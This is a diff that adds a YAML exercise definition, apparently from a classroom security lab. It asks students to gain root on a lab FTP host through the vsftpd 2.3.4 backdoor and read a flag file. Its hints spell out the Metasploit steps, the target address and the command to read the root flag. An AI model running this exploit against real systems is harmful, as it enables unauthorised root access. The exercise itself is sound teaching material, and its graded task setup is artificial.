@@ -1,0 +1,18 @@
+id: "02"
+title: "FLAG_FOOTHOLD — root via the backdoor"
+prompt: |
+  Week 12's vsftpd exploit gets you root on p-ftp-01. The flag waits in
+  /root.
+
+  1. Exploit p-ftp-01 (172.16.10.11) with
+     exploit/unix/ftp/vsftpd_234_backdoor (week 12 technique)
+  2. From the backdoor shell: cat /root/flag.txt
+  3. Save the flag line to ~/kali-class-work/sec-wk14/flag-2.txt
+  4. Claim it: kali-class stamp sec-wk14 flag-foothold
+hints:
+  - "msfconsole → use exploit/unix/ftp/vsftpd_234_backdoor → set RHOSTS 172.16.10.11 → run"
+  - "In the shell: cat /root/flag.txt"
+verify:
+  script: "02-flag-foothold.verify.sh"
+  timeout: 60
+on_success: "FLAG_FOOTHOLD claimed. The 20-year-old bug paid off."
